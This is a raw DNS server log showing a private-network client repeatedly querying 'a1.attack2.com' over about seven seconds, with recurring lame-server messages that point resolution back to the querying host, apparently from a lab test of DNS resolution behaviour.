12-Mar-2025 07:33:18.962 client @0x7f126c019990 172.16.114.11#60294 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.014 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.014 client @0x7f1274000cd0 172.16.114.11#44214 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.058 client @0x7f126c019990 172.16.114.11#60296 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.114 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.118 client @0x7f12b8000cd0 172.16.114.11#41903 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.162 client @0x7f126c019990 172.16.114.11#60302 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.218 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.218 client @0x7f1374000cd0 172.16.114.11#43310 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.254 client @0x7f126c019990 172.16.114.11#60304 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.306 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.306 client @0x7f134c000cd0 172.16.114.11#58862 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.350 client @0x7f126c019990 172.16.114.11#60312 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.402 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.406 client @0x7f12e4000cd0 172.16.114.11#56446 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.450 client @0x7f126c019990 172.16.114.11#60318 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.502 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.502 client @0x7f1344000cd0 172.16.114.11#59830 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.550 client @0x7f126c019990 172.16.114.11#60334 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.590 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.590 client @0x7f12c8000cd0 172.16.114.11#48486 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.622 client @0x7f1294007640 172.16.114.11#60348 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.674 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.678 client @0x7f132c000cd0 172.16.114.11#34735 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.698 client @0x7f1294007640 172.16.114.11#60354 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.754 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.754 client @0x7f128c000cd0 172.16.114.11#46070 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.798 client @0x7f12b4019990 172.16.114.11#60356 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.866 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.866 client @0x7f12cc000cd0 172.16.114.11#58097 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.886 client @0x7f12b4019990 172.16.114.11#60366 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:19.938 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:19.942 client @0x7f12ac000cd0 172.16.114.11#49352 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:19.970 client @0x7f1290007640 172.16.114.11#60378 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.022 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.022 client @0x7f1250000cd0 172.16.114.11#50563 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.066 client @0x7f1290007640 172.16.114.11#60390 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.118 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.122 client @0x7f136c000cd0 172.16.114.11#54783 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.154 client @0x7f1290007640 172.16.114.11#60394 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.210 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.210 client @0x7f1360000cd0 172.16.114.11#38532 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.258 client @0x7f1290007640 172.16.114.11#60406 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.326 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.326 client @0x7f12a0000cd0 172.16.114.11#46743 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.370 client @0x7f1290007640 172.16.114.11#60418 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.438 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.438 client @0x7f12f4000cd0 172.16.114.11#33484 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.482 client @0x7f1290007640 172.16.114.11#60424 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.546 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.546 client @0x7f12c8000cd0 172.16.114.11#54702 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.570 client @0x7f12880483d0 172.16.114.11#60440 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.630 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.634 client @0x7f12a4000cd0 172.16.114.11#44204 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.654 client @0x7f1290007640 172.16.114.11#60446 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.718 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.718 client @0x7f12a4000cd0 172.16.114.11#60192 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.766 client @0x7f1290007640 172.16.114.11#60460 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.830 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.830 client @0x7f12e4000cd0 172.16.114.11#58768 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.878 client @0x7f1290007640 172.16.114.11#60476 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:20.942 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:20.942 client @0x7f12cc000cd0 172.16.114.11#54016 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:20.986 client @0x7f1290007640 172.16.114.11#60488 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.038 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.042 client @0x7f12c8000cd0 172.16.114.11#44367 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.086 client @0x7f12880483d0 172.16.114.11#60504 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.154 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.154 client @0x7f1260000cd0 172.16.114.11#48630 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.202 client @0x7f12880483d0 172.16.114.11#60518 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.274 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.274 client @0x7f1378000cd0 172.16.114.11#44534 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.322 client @0x7f12880483d0 172.16.114.11#60530 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.386 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.386 client @0x7f1284000cd0 172.16.114.11#49623 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.434 client @0x7f12880483d0 172.16.114.11#60546 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.498 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.498 client @0x7f132c000cd0 172.16.114.11#50936 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.546 client @0x7f12880483d0 172.16.114.11#60560 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.610 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.610 client @0x7f1270000cd0 172.16.114.11#43510 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.642 client @0x7f12880483d0 172.16.114.11#60572 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.706 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.706 client @0x7f12a8000cd0 172.16.114.11#39189 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.754 client @0x7f12880483d0 172.16.114.11#60574 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.818 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.822 client @0x7f12a4000cd0 172.16.114.11#41365 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.862 client @0x7f127000b920 172.16.114.11#60590 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:21.926 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:21.930 client @0x7f12e80bf6d0 172.16.114.11#36953 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:21.970 client @0x7f12880483d0 172.16.114.11#60604 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.038 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.038 client @0x7f1374000cd0 172.16.114.11#40766 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.082 client @0x7f12880483d0 172.16.114.11#60616 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.150 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.150 client @0x7f12d8004fb0 172.16.114.11#47710 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.182 client @0x7f12880483d0 172.16.114.11#60632 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.250 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.250 client @0x7f12a8000cd0 172.16.114.11#38839 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.294 client @0x7f12880483d0 172.16.114.11#60648 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.366 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.366 client @0x7f1250000cd0 172.16.114.11#35310 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.414 client @0x7f12880483d0 172.16.114.11#60660 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.482 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.482 client @0x7f134c000cd0 172.16.114.11#60668 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.526 client @0x7f12880483d0 172.16.114.11#60674 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.594 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.594 client @0x7f1338000cd0 172.16.114.11#45156 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.618 client @0x7f127000b920 172.16.114.11#60678 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.682 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.682 client @0x7f12a4000cd0 172.16.114.11#59564 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.730 client @0x7f12880483d0 172.16.114.11#60684 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.798 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.798 client @0x7f12ac000cd0 172.16.114.11#42014 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.830 client @0x7f127000b920 172.16.114.11#60694 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:22.898 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:22.898 client @0x7f1244007570 172.16.114.11#46406 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:22.942 client @0x7f12880483d0 172.16.114.11#60698 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.006 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.006 client @0x7f128c000cd0 172.16.114.11#55775 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.046 client @0x7f12880483d0 172.16.114.11#60714 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.114 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.114 client @0x7f1244007570 172.16.114.11#35723 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.158 client @0x7f12880483d0 172.16.114.11#60728 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.222 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.226 client @0x7f133c000cd0 172.16.114.11#56456 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.270 client @0x7f12880483d0 172.16.114.11#60740 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.334 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.334 client @0x7f1294000cd0 172.16.114.11#42498 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.358 client @0x7f12880483d0 172.16.114.11#60748 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.426 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.426 client @0x7f12ac000cd0 172.16.114.11#47551 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.462 client @0x7f1268011f60 172.16.114.11#60758 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.530 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.530 client @0x7f1258000cd0 172.16.114.11#43367 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.574 client @0x7f1268011f60 172.16.114.11#60772 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.642 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.642 client @0x7f12bc000cd0 172.16.114.11#44159 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.690 client @0x7f1268011f60 172.16.114.11#60782 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.754 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.754 client @0x7f1250000cd0 172.16.114.11#43531 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.802 client @0x7f12880483d0 172.16.114.11#60792 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.866 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.870 client @0x7f12a0000cd0 172.16.114.11#37196 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:23.910 client @0x7f1268011f60 172.16.114.11#60794 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:23.974 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:23.978 client @0x7f13280bf6d0 172.16.114.11#59428 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.002 client @0x7f1268011f60 172.16.114.11#60806 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.066 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.066 client @0x7f1290000cd0 172.16.114.11#42064 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.114 client @0x7f1268011f60 172.16.114.11#60820 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.182 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.182 client @0x7f12980bf6d0 172.16.114.11#52111 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.202 client @0x7f1268011f60 172.16.114.11#60834 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.266 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.270 client @0x7f1358000cd0 172.16.114.11#52298 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.314 client @0x7f1268011f60 172.16.114.11#60850 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.378 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.378 client @0x7f12b8000cd0 172.16.114.11#42032 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.422 client @0x7f12880483d0 172.16.114.11#60864 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.490 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.490 client @0x7f12f4000cd0 172.16.114.11#45149 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.522 client @0x7f1268011f60 172.16.114.11#60878 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.590 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.590 client @0x7f12dc000cd0 172.16.114.11#46104 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.622 client @0x7f1268011f60 172.16.114.11#60886 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.690 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.690 client @0x7f12ac000cd0 172.16.114.11#51518 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.722 client @0x7f1268011f60 172.16.114.11#60898 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.790 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.790 client @0x7f1240000cd0 172.16.114.11#38261 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.834 client @0x7f1268011f60 172.16.114.11#60904 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.902 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.902 client @0x7f137c000cd0 172.16.114.11#37674 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:24.922 client @0x7f1268011f60 172.16.114.11#60908 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:24.990 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:24.990 client @0x7f12f0000cd0 172.16.114.11#45470 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.034 client @0x7f1268011f60 172.16.114.11#55786 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.098 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.098 client @0x7f1290000cd0 172.16.114.11#52912 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.146 client @0x7f1290019990 172.16.114.11#55788 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.198 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.198 client @0x7f12dc000cd0 172.16.114.11#35847 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.246 client @0x7f1268011f60 172.16.114.11#55804 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.306 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.306 client @0x7f1378000cd0 172.16.114.11#35526 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.350 client @0x7f1268011f60 172.16.114.11#55808 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.418 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.418 client @0x7f1360000cd0 172.16.114.11#47922 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.450 client @0x7f1268011f60 172.16.114.11#55818 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.518 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.518 client @0x7f1318000cd0 172.16.114.11#55355 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.562 client @0x7f1290019990 172.16.114.11#55822 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.618 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.622 client @0x7f1284000cd0 172.16.114.11#52321 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.666 client @0x7f1268011f60 172.16.114.11#55828 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.734 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.734 client @0x7f1360000cd0 172.16.114.11#52608 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.766 client @0x7f1268011f60 172.16.114.11#55836 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.834 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
